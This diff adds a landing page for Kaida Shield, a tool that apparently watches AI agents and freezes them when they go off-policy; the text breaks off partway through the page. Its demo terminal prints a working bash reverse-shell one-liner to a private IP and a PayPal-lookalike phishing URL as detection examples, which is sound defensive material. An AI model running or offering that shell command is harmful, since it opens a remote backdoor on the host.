@@ -1,0 +1,1074 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kaida Shield — The Secure Runtime for AI Agents</title>
+    <meta name="description" content="Protect your AI agents from going rogue. Kaida Shield monitors your bots in real time and freezes them if they go off-script. Free.">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-deep: #0a0e17;
+            --bg-card: #111827;
+            --bg-card-hover: #1a2335;
+            --bg-accent: #0d1520;
+            --cyan: #00e5c7;
+            --cyan-glow: rgba(0, 229, 199, 0.15);
+            --cyan-dim: rgba(0, 229, 199, 0.6);
+            --red: #ff4757;
+            --red-glow: rgba(255, 71, 87, 0.15);
+            --orange: #ffa502;
+            --orange-glow: rgba(255, 165, 2, 0.1);
+            --text: #e8eaed;
+            --text-dim: #8892a4;
+            --text-muted: #5a6577;
+            --border: rgba(255,255,255,0.06);
+            --gradient-hero: linear-gradient(135deg, #0a0e17 0%, #0d1a2d 50%, #0a1628 100%);
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { scroll-behavior: smooth; }
+        body {
+            font-family: 'Outfit', sans-serif;
+            background: var(--bg-deep);
+            color: var(--text);
+            line-height: 1.7;
+            overflow-x: hidden;
+        }
+        /* ===== NOISE OVERLAY ===== */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.03'/%3E%3C/svg%3E");
+            pointer-events: none;
+            z-index: 0;
+        }
+        /* ===== NAV ===== */
+        nav {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            z-index: 100;
+            padding: 16px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(10, 14, 23, 0.85);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border);
+        }
+        .nav-logo {
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 700;
+            font-size: 20px;
+            color: var(--cyan);
+            text-decoration: none;
+            letter-spacing: -0.5px;
+        }
+        .nav-logo span { color: var(--text); font-weight: 400; }
+        .nav-links { display: flex; gap: 32px; align-items: center; }
+        .nav-links a {
+            color: var(--text-dim);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+        .nav-links a:hover { color: var(--cyan); }
+        .nav-cta {
+            background: var(--cyan) !important;
+            color: var(--bg-deep) !important;
+            padding: 8px 20px;
+            border-radius: 6px;
+            font-weight: 600 !important;
+            font-size: 13px !important;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .nav-cta:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 20px var(--cyan-glow);
+        }
+        /* ===== HERO ===== */
+        .hero {
+            position: relative;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 120px 24px 80px;
+            background: var(--gradient-hero);
+        }
+        .hero::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: radial-gradient(ellipse 800px 600px at 50% 40%, var(--cyan-glow) 0%, transparent 70%);
+            pointer-events: none;
+        }
+        .hero-content { position: relative; z-index: 1; max-width: 800px; }
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 16px;
+            background: rgba(0, 229, 199, 0.08);
+            border: 1px solid rgba(0, 229, 199, 0.2);
+            border-radius: 100px;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--cyan);
+            margin-bottom: 32px;
+            animation: fadeInUp 0.6s ease;
+        }
+        .hero-badge .dot {
+            width: 6px; height: 6px;
+            background: var(--cyan);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+        h1 {
+            font-size: clamp(40px, 6vw, 72px);
+            font-weight: 900;
+            line-height: 1.05;
+            letter-spacing: -2px;
+            margin-bottom: 24px;
+            animation: fadeInUp 0.6s ease 0.1s both;
+        }
+        h1 .highlight {
+            background: linear-gradient(135deg, var(--cyan), #00b4d8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .hero-sub {
+            font-size: 19px;
+            color: var(--text-dim);
+            max-width: 560px;
+            margin: 0 auto 40px;
+            font-weight: 300;
+            line-height: 1.8;
+            animation: fadeInUp 0.6s ease 0.2s both;
+        }
+        .hero-cta-group {
+            display: flex;
+            gap: 16px;
+            justify-content: center;
+            flex-wrap: wrap;
+            animation: fadeInUp 0.6s ease 0.3s both;
+        }
+        .btn-primary {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 14px 32px;
+            background: var(--cyan);
+            color: var(--bg-deep);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 15px;
+            font-weight: 700;
+            border-radius: 8px;
+            text-decoration: none;
+            transition: transform 0.2s, box-shadow 0.3s;
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px var(--cyan-glow);
+        }
+        .btn-secondary {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 14px 32px;
+            background: transparent;
+            color: var(--text);
+            font-size: 15px;
+            font-weight: 600;
+            border: 1px solid rgba(255,255,255,0.15);
+            border-radius: 8px;
+            text-decoration: none;
+            transition: all 0.2s;
+        }
+        .btn-secondary:hover {
+            border-color: var(--cyan);
+            color: var(--cyan);
+            background: rgba(0, 229, 199, 0.05);
+        }
+        .hero-install {
+            margin-top: 48px;
+            animation: fadeInUp 0.6s ease 0.4s both;
+        }
+        .install-box {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            padding: 14px 24px;
+            background: rgba(0,0,0,0.4);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 15px;
+            color: var(--cyan);
+            cursor: pointer;
+            transition: border-color 0.2s;
+        }
+        .install-box:hover { border-color: var(--cyan-dim); }
+        .install-box .copy-hint {
+            font-family: 'Outfit', sans-serif;
+            font-size: 11px;
+            color: var(--text-muted);
+            padding: 2px 8px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 4px;
+        }
+        /* ===== SECTIONS ===== */
+        section {
+            position: relative;
+            z-index: 1;
+            padding: 100px 24px;
+        }
+        .container { max-width: 1100px; margin: 0 auto; }
+        .section-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--cyan);
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-bottom: 16px;
+        }
+        h2 {
+            font-size: clamp(28px, 4vw, 44px);
+            font-weight: 800;
+            letter-spacing: -1px;
+            line-height: 1.15;
+            margin-bottom: 20px;
+        }
+        .section-desc {
+            font-size: 17px;
+            color: var(--text-dim);
+            max-width: 600px;
+            line-height: 1.8;
+            font-weight: 300;
+        }
+        /* ===== PROBLEM SECTION ===== */
+        .problems { background: var(--bg-accent); }
+        .problem-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 48px;
+        }
+        .problem-card {
+            padding: 28px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            transition: transform 0.3s, border-color 0.3s;
+        }
+        .problem-card:hover {
+            transform: translateY(-3px);
+            border-color: rgba(255, 71, 87, 0.3);
+        }
+        .problem-icon {
+            width: 40px; height: 40px;
+            display: flex; align-items: center; justify-content: center;
+            background: var(--red-glow);
+            border-radius: 8px;
+            font-size: 18px;
+            margin-bottom: 16px;
+        }
+        .problem-card h3 {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: var(--text);
+        }
+        .problem-card p {
+            font-size: 14px;
+            color: var(--text-dim);
+            line-height: 1.7;
+        }
+        .problem-card .quote {
+            margin-top: 12px;
+            padding: 10px 14px;
+            background: rgba(255, 71, 87, 0.06);
+            border-left: 2px solid var(--red);
+            border-radius: 0 6px 6px 0;
+            font-size: 13px;
+            color: var(--text-dim);
+            font-style: italic;
+        }
+        /* ===== SOLUTION / HOW IT WORKS ===== */
+        .solution-steps {
+            margin-top: 56px;
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+        }
+        .step {
+            display: grid;
+            grid-template-columns: 60px 1fr;
+            gap: 24px;
+            padding: 32px 0;
+            border-bottom: 1px solid var(--border);
+        }
+        .step:last-child { border-bottom: none; }
+        .step-num {
+            width: 48px; height: 48px;
+            display: flex; align-items: center; justify-content: center;
+            background: rgba(0, 229, 199, 0.1);
+            border: 1px solid rgba(0, 229, 199, 0.2);
+            border-radius: 12px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--cyan);
+        }
+        .step-content h3 {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .step-content p {
+            color: var(--text-dim);
+            font-size: 15px;
+            line-height: 1.8;
+        }
+        .step-code {
+            margin-top: 12px;
+            padding: 12px 18px;
+            background: rgba(0,0,0,0.3);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            color: var(--cyan);
+            display: inline-block;
+        }
+        /* ===== WHAT IT CATCHES ===== */
+        .catches { background: var(--bg-accent); }
+        .catch-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 16px;
+            margin-top: 48px;
+        }
+        .catch-item {
+            padding: 24px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            transition: all 0.3s;
+        }
+        .catch-item:hover {
+            border-color: rgba(0, 229, 199, 0.3);
+            transform: translateY(-2px);
+        }
+        .catch-icon {
+            font-size: 24px;
+            margin-bottom: 12px;
+        }
+        .catch-item h3 {
+            font-size: 15px;
+            font-weight: 700;
+            margin-bottom: 6px;
+        }
+        .catch-item p {
+            font-size: 13px;
+            color: var(--text-dim);
+            line-height: 1.6;
+        }
+        .catch-item .tag {
+            display: inline-block;
+            margin-top: 10px;
+            padding: 3px 10px;
+            font-size: 11px;
+            font-weight: 600;
+            border-radius: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .tag-freeze { background: rgba(255, 71, 87, 0.15); color: var(--red); }
+        .tag-alert { background: var(--orange-glow); color: var(--orange); }
+        .tag-notify { background: var(--cyan-glow); color: var(--cyan); }
+        /* ===== TEMPLATES ===== */
+        .templates-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 12px;
+            margin-top: 40px;
+        }
+        .template-card {
+            padding: 20px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            text-align: center;
+            transition: all 0.3s;
+        }
+        .template-card:hover {
+            border-color: rgba(0, 229, 199, 0.3);
+            background: var(--bg-card-hover);
+        }
+        .template-card .emoji { font-size: 28px; margin-bottom: 10px; }
+        .template-card h3 { font-size: 14px; font-weight: 600; }
+        .template-card p { font-size: 12px; color: var(--text-muted); margin-top: 4px; }
+        /* ===== DEMO SECTION ===== */
+        .demo-section { background: var(--bg-accent); }
+        .demo-window {
+            margin-top: 40px;
+            background: #0d1117;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+        }
+        .demo-titlebar {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 16px;
+            background: rgba(0,0,0,0.3);
+            border-bottom: 1px solid var(--border);
+        }
+        .demo-dot { width: 10px; height: 10px; border-radius: 50%; }
+        .demo-dot.r { background: #ff5f57; }
+        .demo-dot.y { background: #febc2e; }
+        .demo-dot.g { background: #28c840; }
+        .demo-titlebar span {
+            margin-left: 8px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+        .demo-body {
+            padding: 24px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            line-height: 2;
+            color: var(--text-dim);
+        }
+        .demo-body .prompt { color: var(--cyan); }
+        .demo-body .safe { color: #28c840; }
+        .demo-body .danger { color: var(--red); }
+        .demo-body .warn { color: var(--orange); }
+        .demo-body .dim { color: var(--text-muted); }
+        /* ===== MULTI-AGENT ===== */
+        .multi-agent-visual {
+            display: flex;
+            gap: 16px;
+            margin-top: 40px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .agent-box {
+            padding: 20px 24px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            text-align: center;
+            min-width: 160px;
+            transition: all 0.3s;
+        }
+        .agent-box:hover { border-color: rgba(0, 229, 199, 0.3); }
+        .agent-box .emoji { font-size: 28px; }
+        .agent-box h4 { font-size: 14px; font-weight: 600; margin-top: 8px; }
+        .agent-box p { font-size: 12px; color: var(--text-muted); margin-top: 4px; }
+        .agent-box .status {
+            display: inline-block;
+            margin-top: 8px;
+            padding: 2px 10px;
+            font-size: 11px;
+            font-weight: 600;
+            border-radius: 4px;
+            background: rgba(0, 229, 199, 0.1);
+            color: var(--cyan);
+        }
+        .shield-center {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            padding: 20px;
+        }
+        .shield-center .shield-icon {
+            width: 56px; height: 56px;
+            display: flex; align-items: center; justify-content: center;
+            background: rgba(0, 229, 199, 0.12);
+            border: 2px solid var(--cyan);
+            border-radius: 50%;
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+        .shield-center p {
+            font-size: 12px;
+            color: var(--cyan);
+            font-weight: 600;
+        }
+        /* ===== CTA SECTION ===== */
+        .cta-section {
+            text-align: center;
+            padding: 120px 24px;
+            background: var(--gradient-hero);
+            position: relative;
+        }
+        .cta-section::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: radial-gradient(ellipse 600px 400px at 50% 50%, var(--cyan-glow) 0%, transparent 70%);
+            pointer-events: none;
+        }
+        .cta-section .container { position: relative; z-index: 1; }
+        .cta-install-steps {
+            display: flex;
+            gap: 24px;
+            justify-content: center;
+            margin-top: 40px;
+            flex-wrap: wrap;
+        }
+        .cta-step {
+            padding: 20px 24px;
+            background: rgba(0,0,0,0.3);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            text-align: left;
+            min-width: 240px;
+        }
+        .cta-step .num {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            color: var(--cyan);
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .cta-step .cmd {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            color: var(--text);
+        }
+        .cta-step p {
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-top: 4px;
+        }
+        /* ===== FOOTER ===== */
+        footer {
+            padding: 40px 24px;
+            border-top: 1px solid var(--border);
+            text-align: center;
+        }
+        footer p {
+            font-size: 13px;
+            color: var(--text-muted);
+        }
+        footer a { color: var(--cyan); text-decoration: none; }
+        footer a:hover { text-decoration: underline; }
+        .footer-links {
+            display: flex;
+            gap: 24px;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+        /* ===== HONEST SECTION ===== */
+        .honest-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+            margin-top: 40px;
+        }
+        .honest-col h3 {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .honest-list {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .honest-list li {
+            font-size: 14px;
+            color: var(--text-dim);
+            padding-left: 24px;
+            position: relative;
+            line-height: 1.6;
+        }
+        .honest-list li::before {
+            position: absolute;
+            left: 0;
+            font-size: 14px;
+        }
+        .honest-list.yes li::before { content: '\2713'; color: var(--cyan); }
+        .honest-list.no li::before { content: '\2192'; color: var(--text-muted); }
+        /* ===== ANIMATIONS ===== */
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            nav { padding: 12px 20px; }
+            .nav-links a:not(.nav-cta) { display: none; }
+            .step { grid-template-columns: 1fr; gap: 12px; }
+            .honest-grid { grid-template-columns: 1fr; }
+            .cta-install-steps { flex-direction: column; align-items: center; }
+            .multi-agent-visual { flex-direction: column; align-items: center; }
+        }
+    </style>
+</head>
+<body>
+<!-- NAV -->
+<nav>
+    <a href="#" class="nav-logo">kaida<span> shield</span></a>
+    <div class="nav-links">
+        <a href="#problems">Why Kaida</a>
+        <a href="#how-it-works">How It Works</a>
+        <a href="#catches">Features</a>
+        <a href="https://github.com/ajpandit775/kaida-shield" target="_blank">GitHub</a>
+        <a href="https://pypi.org/project/kaida-shield/" target="_blank" class="nav-cta">Install Free</a>
+    </div>
+</nav>
+<!-- HERO -->
+<section class="hero">
+    <div class="hero-content">
+        <div class="hero-badge">
+            <span class="dot"></span>
+            v0.2.0 — Now with anomaly detection
+        </div>
+        <h1>Your bots work.<br><span class="highlight">Kaida keeps them safe.</span></h1>
+        <p class="hero-sub">
+            AI agents need dangerous permissions to be useful. Kaida monitors what they actually do — and freezes them the moment they go off-script.
+        </p>
+        <div class="hero-cta-group">
+            <a href="https://pypi.org/project/kaida-shield/" class="btn-primary" target="_blank">
+                Install Free →
+            </a>
+            <a href="#how-it-works" class="btn-secondary">
+                See How It Works
+            </a>
+        </div>
+        <div class="hero-install">
+            <div class="install-box" onclick="navigator.clipboard.writeText('pip install kaida-shield'); this.querySelector('.copy-hint').textContent='Copied!'">
+                pip install kaida-shield
+                <span class="copy-hint">Click to copy</span>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- PROBLEMS -->
+<section class="problems" id="problems">
+    <div class="container">
+        <div class="section-label">The Problem</div>
+        <h2>Your agents are running blind</h2>
+        <p class="section-desc">
+            Thousands of people are running AI agents 24/7 with access to files, browsers, and accounts. Nobody is watching what they actually do.
+        </p>
+        <div class="problem-grid">
+            <div class="problem-card">
+                <div class="problem-icon">🔁</div>
+                <h3>Bots stuck in loops</h3>
+                <p>Your agent repeats the same action hundreds of times, burning through API tokens and accomplishing nothing. You don't notice for hours.</p>
+                <div class="quote">"My agent just repeats and repeats. No matter what message I send. How to fix it?"</div>
+            </div>
+            <div class="problem-card">
+                <div class="problem-icon">🌐</div>
+                <h3>Accessing things they shouldn't</h3>
+                <p>Your bot was supposed to check LinkedIn for jobs. It's now browsing your email, reading your bank statements, and scraping your contacts.</p>
+                <div class="quote">"My agent now navigates pages, clicks elements, and scrapes authenticated content from my Mac's Chrome — all without touching a keyboard."</div>
+            </div>
+            <div class="problem-card">
+                <div class="problem-icon">💸</div>
+                <h3>Burning through tokens</h3>
+                <p>Your agent makes hundreds of unnecessary API calls, draining your credits on tasks nobody asked for. The bill arrives before you notice.</p>
+                <div class="quote">"Use the auto free API, rotate when one cools down" — free API keys with zero security between them and your agent.</div>
+            </div>
+            <div class="problem-card">
+                <div class="problem-icon">🎭</div>
+                <h3>Going completely off-script</h3>
+                <p>Every individual action looks legitimate. But the pattern is malicious — scraping data, generating content, publishing it. No firewall catches the sequence.</p>
+                <div class="quote">"I want to automate 700+ WordPress articles with full SEO" — one mistake and 700 articles get destroyed.</div>
+            </div>
+            <div class="problem-card">
+                <div class="problem-icon">🔓</div>
+                <h3>Authenticated sessions exposed</h3>
+                <p>Your agent has 24/7 access to your logged-in browser sessions. If it visits a phishing page, it has access to every account you're logged into.</p>
+                <div class="quote">"Agent runs on VPS, reverse tunnel to Mac mini with Chrome headless — runs 24/7 automatically."</div>
+            </div>
+            <div class="problem-card">
+                <div class="problem-icon">⚡</div>
+                <h3>No off switch</h3>
+                <p>The only fix is to kill the agent and lose all your work. There's nothing between "running" and "dead." No pause. No inspection. No recovery.</p>
+                <div class="quote">"The only fix was to kill the agent and lose all your work."</div>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- HOW IT WORKS -->
+<section id="how-it-works">
+    <div class="container">
+        <div class="section-label">How It Works</div>
+        <h2>Describe your bot. Kaida does the rest.</h2>
+        <p class="section-desc">
+            No coding needed. Tell Kaida what your bot should do in plain English. Kaida generates the safety rules and watches your bot in real time.
+        </p>
+        <div class="solution-steps">
+            <div class="step">
+                <div class="step-num">1</div>
+                <div class="step-content">
+                    <h3>Install your bot first</h3>
+                    <p>Set up your AI agent as you normally would — OpenClaw, LangChain, CrewAI, or any framework. Make sure it works on its own. Kaida doesn't replace your bot — it protects it.</p>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-num">2</div>
+                <div class="step-content">
+                    <h3>Install Kaida Shield</h3>
+                    <p>One command. Works on Windows, Linux, and macOS.</p>
+                    <div class="step-code">pip install kaida-shield</div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-num">3</div>
+                <div class="step-content">
+                    <h3>Describe what your bot should do</h3>
+                    <p>Open the dashboard and tell Kaida in plain English: <em>"My bot scrapes job listings from LinkedIn and Indeed, saves them to a spreadsheet in my Documents folder. It should not access any other websites or write files anywhere else."</em> Kaida generates the safety rules automatically.</p>
+                    <div class="step-code">kaida ui</div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-num">4</div>
+                <div class="step-content">
+                    <h3>Run your bot with protection</h3>
+                    <p>Start your bot through Kaida — in the dashboard or from the terminal. Kaida monitors which websites it connects to, which files it touches, and what commands it runs. If everything matches your rules, you'll never notice Kaida is there.</p>
+                    <div class="step-code">kaida shield run --policy my-policy python my_bot.py</div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-num">5</div>
+                <div class="step-content">
+                    <h3>Kaida freezes, not kills</h3>
+                    <p>If your bot tries something outside your rules, Kaida <strong>freezes it</strong> — doesn't kill it. Your work is preserved. You decide what to do: release it, adjust the rules, or stop it. No work lost.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- WHAT IT CATCHES -->
+<section class="catches" id="catches">
+    <div class="container">
+        <div class="section-label">Protection</div>
+        <h2>What Kaida catches</h2>
+        <p class="section-desc">
+            Real threats. Real-time detection. No configuration required for the basics — Kaida comes loaded with hundreds of known threat patterns.
+        </p>
+        <div class="catch-grid">
+            <div class="catch-item">
+                <div class="catch-icon">🔁</div>
+                <h3>Bots stuck in loops</h3>
+                <p>Detects your bot repeating the same action and freezes it before it burns through your tokens.</p>
+                <span class="tag tag-freeze">Freeze</span>
+            </div>
+            <div class="catch-item">
+                <div class="catch-icon">🌐</div>
+                <h3>Unauthorized websites</h3>
+                <p>Bot tries to access a domain not in your policy — blocked instantly.</p>
+                <span class="tag tag-freeze">Freeze</span>
+            </div>
+            <div class="catch-item">
+                <div class="catch-icon">📁</div>
+                <h3>File access violations</h3>
+                <p>Bot reading or writing files outside allowed folders — caught and stopped.</p>
+                <span class="tag tag-freeze">Freeze</span>
+            </div>
+            <div class="catch-item">
+                <div class="catch-icon">🎣</div>
+                <h3>Phishing URLs</h3>
+                <p>Fake login pages impersonating PayPal, Google, Amazon, and other major brands.</p>
+                <span class="tag tag-freeze">Freeze</span>
+            </div>
+            <div class="catch-item">
+                <div class="catch-icon">💉</div>
+                <h3>Prompt injection</h3>
+                <p>Attackers trying to hijack your bot's instructions through malicious input.</p>
+                <span class="tag tag-freeze">Freeze</span>
+            </div>
+            <div class="catch-item">
+                <div class="catch-icon">📈</div>
+                <h3>Activity spikes</h3>
+                <p>Sudden burst of activity way above normal — usually a sign something went wrong.</p>
+                <span class="tag tag-alert">Alert</span>
+            </div>
+            <div class="catch-item">
+                <div class="catch-icon">💸</div>
+                <h3>Token burn</h3>
+                <p>Excessive API calls per minute — your bot is wasting credits.</p>
+                <span class="tag tag-alert">Alert</span>
+            </div>
+            <div class="catch-item">
+                <div class="catch-icon">😴</div>
+                <h3>Stalled bots</h3>
+                <p>Your bot stopped doing anything — Kaida notifies you so you can investigate.</p>
+                <span class="tag tag-notify">Notify</span>
+            </div>
+            <div class="catch-item">
+                <div class="catch-icon">🐚</div>
+                <h3>Reverse shells</h3>
+                <p>Malicious commands trying to open a backdoor to your system.</p>
+                <span class="tag tag-freeze">Freeze</span>
+            </div>
+            <div class="catch-item">
+                <div class="catch-icon">⛏️</div>
+                <h3>Crypto miners</h3>
+                <p>Bot trying to mine cryptocurrency using your computer's resources.</p>
+                <span class="tag tag-freeze">Freeze</span>
+            </div>
+            <div class="catch-item">
+                <div class="catch-icon">📤</div>
+                <h3>Data exfiltration</h3>
+                <p>Unauthorized attempts to send your data to external servers.</p>
+                <span class="tag tag-freeze">Freeze</span>
+            </div>
+            <div class="catch-item">
+                <div class="catch-icon">🔑</div>
+                <h3>Credential harvesting</h3>
+                <p>Fake forms and pages trying to steal your login credentials.</p>
+                <span class="tag tag-freeze">Freeze</span>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- TEMPLATES -->
+<section>
+    <div class="container">
+        <div class="section-label">Quick Start</div>
+        <h2>Templates for every workflow</h2>
+        <p class="section-desc">
+            Get running in seconds. Pick a template that matches your bot, or describe your own workflow in plain English.
+        </p>
+        <div class="templates-grid">
+            <div class="template-card">
+                <div class="emoji">📧</div>
+                <h3>Email Assistant</h3>
+                <p>Check, draft, organize</p>
+            </div>
+            <div class="template-card">
+                <div class="emoji">🔍</div>
+                <h3>Web Researcher</h3>
+                <p>Search, scrape, summarize</p>
+            </div>
+            <div class="template-card">
+                <div class="emoji">📱</div>
+                <h3>Social Media</h3>
+                <p>Post, schedule, monitor</p>
+            </div>
+            <div class="template-card">
+                <div class="emoji">📸</div>
+                <h3>Photo Organizer</h3>
+                <p>Sort, tag, back up</p>
+            </div>
+            <div class="template-card">
+                <div class="emoji">🍳</div>
+                <h3>Recipe Collector</h3>
+                <p>Find, save, categorize</p>
+            </div>
+            <div class="template-card">
+                <div class="emoji">💼</div>
+                <h3>Job Hunter</h3>
+                <p>Search, apply, track</p>
+            </div>
+            <div class="template-card">
+                <div class="emoji">📝</div>
+                <h3>Meeting Notes</h3>
+                <p>Record, summarize, share</p>
+            </div>
+            <div class="template-card">
+                <div class="emoji">🔧</div>
+                <h3>Custom Policy</h3>
+                <p>Describe your own workflow</p>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- DEMO -->
+<section class="demo-section">
+    <div class="container">
+        <div class="section-label">See It Live</div>
+        <h2>Watch Kaida catch threats in real time</h2>
+        <p class="section-desc">
+            Run <code style="color:var(--cyan); background:rgba(0,0,0,0.3); padding:2px 8px; border-radius:4px;">kaida demo</code> to see 16 live threat detection scenarios — phishing, reverse shells, crypto miners, loops, and more.
+        </p>
+        <div class="demo-window">
+            <div class="demo-titlebar">
+                <div class="demo-dot r"></div>
+                <div class="demo-dot y"></div>
+                <div class="demo-dot g"></div>
+                <span>Terminal — kaida demo</span>
+            </div>
+            <div class="demo-body">
+                <span class="prompt">$</span> kaida demo<br>
+                <br>
+                <span class="dim">──── Kaida Shield v0.2.0 — Live Threat Detection Demo ────</span><br>
+                <br>
+                <span class="dim">[1/16]</span> Scanning URL: https://paypa1-secure.com/login<br>
+                <span class="danger">       ✗ DANGEROUS — Phishing: brand impersonation detected</span><br>
+                <br>
+                <span class="dim">[2/16]</span> Scanning command: bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1<br>
+                <span class="danger">       ✗ DANGEROUS — Reverse shell detected</span><br>
+                <br>
+                <span class="dim">[3/16]</span> Scanning URL: https://github.com/trending<br>
+                <span class="safe">       ✓ SAFE — No threats detected</span><br>
+                <br>
+                <span class="dim">[4/16]</span> Scanning command: pip install requests<br>
+                <span class="safe">       ✓ SAFE — No threats detected</span><br>
+                <br>
+                <span class="dim">[5/16]</span> Detecting loop: 50 identical requests to same URL<br>
+                <span class="warn">       ⚠ LOOP DETECTED — Bot repeating same action (92% identical)</span><br>
+                <br>
+                <span class="dim">[6/16]</span> Detecting rate spike: 100 actions in 1 second<br>
+                <span class="warn">       ⚠ RATE SPIKE — Activity 10x above normal baseline</span><br>
+                <br>
+                <span class="dim">       ... 10 more scenarios ...</span><br>
+                <br>
+                <span class="safe">──── Results: 16/16 scenarios detected correctly ────</span><br>
+                <span class="safe">       Threats blocked: 12 | Safe cleared: 4 | Missed: 0</span><br>
+                <span class="safe">       Detection accuracy: 100%</span><br>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- MULTI-AGENT -->
+<section>
+    <div class="container">
+        <div class="section-label">Multi-Agent</div>
+        <h2>Protect all your bots at once</h2>
+        <p class="section-desc">
+            Running multiple agents? Each one gets its own policy. One bot misbehaving doesn't affect the others.
+        </p>
+        <div class="multi-agent-visual">
+            <div class="agent-box">
+                <div class="emoji">📧</div>
+                <h4>Email Bot</h4>
+                <p>gmail.com only</p>
+                <span class="status">Protected</span>
+            </div>
+            <div class="agent-box">
+                <div class="emoji">🔍</div>
+                <h4>Research Bot</h4>
+                <p>linkedin.com, indeed.com</p>
+                <span class="status">Protected</span>
+            </div>
+            <div class="shield-center">
+                <div class="shield-icon">🛡️</div>
+                <p>Kaida Shield</p>
+            </div>
+            <div class="agent-box">
+                <div class="emoji">📱</div>
+                <h4>Social Bot</h4>
+                <p>twitter.com, buffer.com</p>
+                <span class="status">Protected</span>
+            </div>
+            <div class="agent-box">
